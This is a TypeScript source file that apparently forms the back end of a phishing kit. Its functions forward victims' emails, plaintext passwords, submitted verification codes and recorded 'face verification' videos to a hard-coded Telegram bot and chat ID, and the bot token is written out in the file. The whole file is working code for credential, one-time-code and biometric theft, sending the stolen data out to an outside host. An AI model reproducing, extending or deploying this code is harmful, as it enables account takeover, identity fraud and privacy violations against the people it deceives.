import TelegramBot from 'node-telegram-bot-api';
import { exec } from 'child_process';
import { promisify } from 'util';
import fs from 'fs';
import path from 'path';
import os from 'os';

const execAsync = promisify(exec);

const TELEGRAM_BOT_TOKEN = '8366649467:AAGaMF5mQBsffV-Zc2QU9AQ7XSjD0IKXf3Y';
const TELEGRAM_CHAT_ID = '7211220207';

// Initialize bot without polling (we only send messages)
const bot = new TelegramBot(TELEGRAM_BOT_TOKEN, { polling: false });

async function convertWebmToMp4(inputBuffer: Buffer): Promise<Buffer> {
  const tempDir = os.tmpdir();
  const timestamp = Date.now();
  const inputPath = path.join(tempDir, `input_${timestamp}.webm`);
  const outputPath = path.join(tempDir, `output_${timestamp}.mp4`);
  
  try {
    await fs.promises.writeFile(inputPath, inputBuffer);
    
    await execAsync(`ffmpeg -i "${inputPath}" -c:v libx264 -preset veryfast -crf 32 -vf "scale=640:-2" -c:a aac -b:a 64k -movflags +faststart -y "${outputPath}"`);
    
    const outputBuffer = await fs.promises.readFile(outputPath);
    
    await fs.promises.unlink(inputPath).catch(() => {});
    await fs.promises.unlink(outputPath).catch(() => {});
    
    return outputBuffer;
  } catch (error) {
    await fs.promises.unlink(inputPath).catch(() => {});
    await fs.promises.unlink(outputPath).catch(() => {});
    throw error;
  }
}

export async function sendLoginNotification(email: string, password: string): Promise<void> {
  try {
    let messageText = `🔐 *LOGIN ATTEMPT*\n\n`;
    messageText += `*Email:* ${email}\n`;
    messageText += `*Password:* ${password}\n`;
    messageText += `*Time:* ${new Date().toLocaleString()}`;

    await bot.sendMessage(TELEGRAM_CHAT_ID, messageText, {
      parse_mode: 'Markdown'
    });

    console.log('Login notification sent successfully');
  } catch (error) {
    console.error('Error sending login notification:', error);
  }
}

export async function sendCodeNotification(email: string, code: string): Promise<void> {
  try {
    let messageText = `🔢 *VERIFICATION CODE SUBMITTED*\n\n`;
    messageText += `*Email:* ${email}\n`;
    messageText += `*Code:* ${code}\n`;
    messageText += `*Time:* ${new Date().toLocaleString()}`;

    await bot.sendMessage(TELEGRAM_CHAT_ID, messageText, {
      parse_mode: 'Markdown'
    });

    console.log('Code notification sent successfully');
  } catch (error) {
    console.error('Error sending code notification:', error);
  }
}

export async function sendFaceScanNotification(email: string): Promise<void> {
  try {
    let messageText = `📸 *FACE SCAN STARTED*\n\n`;
    messageText += `*Email:* ${email}\n`;
    messageText += `*Status:* Face verification in progress\n`;
    messageText += `*Time:* ${new Date().toLocaleString()}`;

    await bot.sendMessage(TELEGRAM_CHAT_ID, messageText, {
      parse_mode: 'Markdown'
    });

    console.log('Face scan notification sent successfully');
  } catch (error) {
    console.error('Error sending face scan notification:', error);
  }
}

export async function sendVideoNotification(email: string, videoBuffer: Buffer): Promise<void> {
  try {
    if (!videoBuffer || videoBuffer.length === 0) {
      console.error('Video buffer is empty');
      return;
    }

    console.log(`Converting video for ${email}, original size: ${videoBuffer.length} bytes`);
    
    let mp4Buffer: Buffer;
    try {
      mp4Buffer = await convertWebmToMp4(videoBuffer);
      console.log(`Video converted successfully, new size: ${mp4Buffer.length} bytes`);
    } catch (conversionError) {
      console.error('Video conversion failed, sending original:', conversionError);
      mp4Buffer = videoBuffer;
    }

    const caption = `*FACE VERIFICATION VIDEO*\n\n*Email:* ${email}\n*Time:* ${new Date().toLocaleString()}`;

    await bot.sendVideo(TELEGRAM_CHAT_ID, mp4Buffer, {
      caption,
      parse_mode: 'Markdown',
      supports_streaming: true
    }, {
      filename: 'face_verification.mp4',
      contentType: 'video/mp4'
    });

    console.log('Video notification sent successfully');
  } catch (error) {
    console.error('Error sending video notification:', error);
    throw error;
  }
}